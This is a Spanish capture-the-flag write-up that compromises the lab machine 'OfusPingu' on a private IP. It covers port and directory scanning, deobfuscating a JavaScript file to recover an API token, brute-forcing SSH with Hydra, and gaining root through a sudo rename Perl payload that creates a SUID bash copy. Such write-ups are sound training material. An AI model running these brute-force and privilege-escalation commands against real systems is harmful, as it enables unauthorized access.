OfusPingu


https://medium.com/@aps88/thehackerslabs-ofuspingu-d01d2a3d050d


gobuster dir -u http://10.0.250.7 -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404   




```bash
nmap -sS --min-rate 5000 -p- --open -n -Pn -oN scan.txt 10.0.250.7
```

# Nmap 7.95 scan initiated Thu Sep 11 14:41:34 2025 as: /usr/lib/nmap/nmap -sS --min-rate 5000 -p- --open -n -Pn -oN scan.txt 10.0.250.7
Nmap scan report for 10.0.250.7
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:26:BC:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

# Nmap done at Thu Sep 11 14:41:36 2025 -- 1 IP address (1 host up) scanned in 1.79 seconds


--------------------------------------------------------------------------------------
```bash
nmap -p22,80,3000 -sV -sC -Pn -vvv -n -oN fullScan.txt 10.0.250.7
```
Nmap scan report for 10.0.250.7
Host is up, received arp-response (0.00044s latency).
Scanned at 2025-09-11 14:42:15 EDT for 12s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:08:d0:7c:02:65:4d:8b:95:7b:a2:89:af:ab:fc:9c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPaWcRxx5gFOenaXKBFatuA5JxNag5k0IxEtpe/iTHl2+1SVEKXXkYPOfbOWgFiDkFJWRxL999wnKj4dSjbjdHc=
|   256 af:ff:d1:1b:e2:5a:32:cb:23:47:71:2d:7a:2c:93:2e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKkXlc/MO2EqgfQh9tiJNJ+Qz3PhwQbv2bTlpigCNFHV
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Ofuscaci\xC3\xB3n de C\xC3\xB3digo JavaScript | Seguridad en APIs
|_http-server-header: Apache/2.4.62 (Debian)
3000/tcp open  http    syn-ack ttl 64 Node.js Express framework
|_http-title: Error
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 08:00:27:26:BC:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 11 14:42:27 2025 -- 1 IP address (1 host up) scanned in 12.79 seconds
                                                                                                                                                            --------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------
```bash
gobuster dir -u http://10.0.250.7 -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404
```

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.250.7
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,css,js,txt,pdf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 17244]
/script.js            (Status: 200) [Size: 1492]



--------------------------------------------------------------------------
## archivo script.js   
```
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c d(){2 e=v.w(f=>f.x()).4(\'\');2 g={y:\'1.0.3\',z:\'A\',B:\'C://D/E\',h:{F:\'G\',i:e.5(\'\').6().4(\'\')+\'H\'.5(\'\').6().4(\'\')},I:{J:K,L:M}};2 j=()=>{2 7=g.h.i.N(0,-3).5(\'\').6().4(\'\');8.9(\'O a P Q R S:\',7);k{T:U,V:\'WÃ³n X\',Y:Z(7+\':\'+\'10\')}};l(11.12.13===\'14\'){15(()=>{2 m=j();8.9(\'16 17Ã³n:\',m)},18)}}o.p(\'19\',()=>{d();2 q=o.1a(\'1b\');q.1c(r=>{r.p(\'1d\',()=>{8.9(\'1eÃ³n 1f\')})})});c s(a){2 t=\'1g\';k a===t}l(1h b!==\'1i\'&&b.u){b.u={s}}',62,81,'||const||join|split|reverse|claveFinal|console|log||module|function|inicializarAplicacion|API_KEY_SECRETA|part|appConfig|credenciales|acceso|conectarAPI|return|if|conexion||document|addEventListener|buttons|btn|validarClave|claveReal|exports|configParts|map|toLowerCase|version|entorno|produccion|apiEndpoint|https|adivinaadivinanza|v3|usuario|jeje|123|features|darkMode|true|analytics|false|slice|Conectando|la|API|con|clave|status|200|message|Conexi|exitosa|token|btoa|admin|window|location|hostname|secretazosecreton|setTimeout|Resultado|conexi|3000|DOMContentLoaded|querySelectorAll|button|forEach|click|Bot|clickeado|QWERTYCHOCOLATITOCHOCOLATONCHINGON|typeof|undefined'.split('|'),0,{}))
```




## Al desofuscarlo se ve lo siguiente:
```

function inicializarAplicacion() {
    const API_KEY_SECRETA = configParts.map(f => f.toLowerCase()).join('');
    const appConfig = {
        version: '1.0.3',
        entorno: 'produccion',
        apiEndpoint: 'https://adivinaadivinanza/v3',
        credenciales: {
            usuario: 'jeje',
            acceso: API_KEY_SECRETA.split('').reverse().join('') + '123'.split('').reverse().join('')
        },
        features: {
            darkMode: true,
            analytics: false
        }
    };
    const conectarAPI = () => {
        const claveFinal = appConfig.credenciales.acceso.slice(0, -3).split('').reverse().join('');
        console.log('Conectando la API con clave:', claveFinal);
        return {
            status: 200,
            message: 'Conexión exitosa',
            token: btoa(claveFinal + ':' + 'admin')
        };
    };
    if (window.location.hostname === 'secretazosecreton') {
        setTimeout(() => {
            const m = conectarAPI();
            console.log('Resultado conexión:', m)
        }, 3000)
    }
}
document.addEventListener('DOMContentLoaded', () => {
    inicializarAplicacion();
    const q = document.querySelectorAll('button');
    q.forEach(r => {
        r.addEventListener('click', () => {
            console.log('Botón clickeado')
        })
    })
});

function validarClave(a) {
    const t = 'QWERTYCHOCOLATITOCHOCOLATONCHINGON';
    return a === t
}
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        validarClave
    }
}

```

------------------------------------------------------------------------------------------

Tienes herramientas online para hacerlo como Javascript Deobfuscator

Localizamos la función clave validarClave(a):
function validarClave(a) {
    const t = 'QWERTYCHOCOLATITOCHOCOLATONCHINGON';
    return a === t
}
En lo que parece un token.

3. Explotación de la API (Puerto 3000)
Al entrar vía navegador vemos el siguiente mensaje:


------------------------------------------------------------------


Pruebo otros métodos como POST pero es en vano.

3.1 Enumeración de Rutas
gobuster dir -u http://10.0.250.7:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,js,txt
Salida:

/view                 (Status: 400) [Size: 22]
/public               (Status: 301) [Size: 156] [--> /public/]
/api                  (Status: 400) [Size: 34]
Aunque /api tenga un status 400 vamos a intentar trabajar con ella, ya que antes vimos un posible token.
Al entrar vemos lo siguiente:

--------------------------------------------------------------------------------------------------------------------
3.2 Petición con Token
Probamos la clave extraída:

http://10.0.250.7:3000/api?token=QWERTYCHOCOLATITOCHOCOLATONCHINGON


```
key	"MI-KEY-SECRETA-12345"
```

----------------------------------------------------------------------------------------

3.3 Acceso a /view
Ahora vamos al directorio /view y hacemos lo mismo con la key que nos ha dado.

http://10.0.250.7:3000/view?key=MI-KEY-SECRETA-12345
Respuesta:

Press enter or click to view image in full size

El servidor invita a conectarse por SSH con usuario debian.




```
Bienvenido a la Zona Secreta! 🎉

Has accedido correctamente al área privada del sistema.
Ahora debes entrar por SSH con debian usando alguna contraseña.
```

------------------------------------------------------------------------------
4. Obtención de Credenciales SSH
Realizamos ataque de diccionario con Hydra:
```
hydra -l debian -P /usr/share/wordlists/rockyou.txt ssh://10.0.250.7




[DATA] attacking ssh://10.0.250.7:22/
[22][ssh] host: 10.0.250.7   login: debian   password: chocolate
1 of 1 target successfully completed, 1 valid password found
                                                                                                                                                            
```


------------------------------------------------------------------------------

## Nos conectamos vía SSH


```
ssh debian@10.0.250.7
debian@10.0.250.7's password: 
Linux OfusPingu 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64
Last login: Wed Sep 17 21:25:41 2025 from 10.0.250.5
debian@OfusPingu:~$ whoami
debian
debian@OfusPingu:~$ 

```

----------------------------------------------------------------------------------

## Bandera de Usuario

debian@OfusPingu:~$ ls
flag.txt  mi-web
debian@OfusPingu:~$ cat flag.txt 
457354T99UOGN495HG945HG9WHGT9HGS
----------------------------------------------------------------------------------

## Escalar privilegios

```

debian@OfusPingu:~$ sudo -l
Matching Defaults entries for debian on OfusPingu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on OfusPingu:
    (ALL) NOPASSWD: /usr/bin/rename
debian@OfusPingu:~$ 
```


## Abuso de rename (Perl)
El comando rename en Debian es un script Perl que evalúa expresiones:

cd /tmp
# Creamos un archivo dummy
touch dummy

# Ejecutamos rename con payload Perl para copiar bash y establecer SUID
sudo rename 'system("cp /bin/bash /tmp/pwnsh; chmod 4755 /tmp/pwnsh")' dummy

# Invocamos nuestro shell root
/tmp/pwnsh -p



debian@OfusPingu:/tmp$ /tmp/pwnsh -p
pwnsh-5.2# whoami
root

----------------------------------------------------------------------------------



## Bandera de Root


pwnsh-5.2# cd /
pwnsh-5.2# cd root/
pwnsh-5.2# cat 
.bash_history     .lesshst          .mysql_history    .profile          .selected_editor  
.bashrc           .local/           .npm/             root.txt          .ssh/             
pwnsh-5.2# cat root.txt 
D99G9GFDF90G6FD06G7DF8S6GS8D79F
pwnsh-5.2# 

